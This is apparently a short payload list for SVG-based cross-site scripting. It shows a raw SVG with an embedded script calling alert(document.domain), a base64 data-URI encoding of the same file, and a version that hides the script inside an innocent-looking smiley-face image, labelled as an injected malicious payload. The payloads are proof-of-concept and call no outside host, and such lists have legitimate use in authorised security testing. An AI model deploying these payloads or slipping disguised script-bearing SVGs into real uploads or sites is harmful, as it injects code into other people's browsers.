# xss_svg_payloads

**Raw**

```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
    <script>//<![CDATA[
        alert(document.domain)
    //]]>
    </script>
</svg>
```


**Base 64**

```
data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MDAgNTAwIj4KICAgIDxzY3JpcHQ+Ly88IVtDREFUQVsKICAgICAgICBhbGVydChkb2N1bWVudC5kb21haW4pCiAgICAvL11dPgogICAgPC9zY3JpcHQ+Cjwvc3ZnPgo=
```

**Binded**

```xml
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <!-- Head -->
  <circle cx="50" cy="50" r="40" fill="yellow" />

  <!-- Eyes -->
  <circle cx="35" cy="40" r="5" fill="black" />
  <circle cx="65" cy="40" r="5" fill="black" />

  <!-- Mouth -->
  <path d="M 30,60 Q 50,70 70,60" fill="none" stroke="black" stroke-width="2" />

  <!-- Injected Malicious SVG Payload -->
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
    <script>//<![CDATA[
        alert(document.domain)
    //]]>
    </script>
  </svg>
</svg>
```
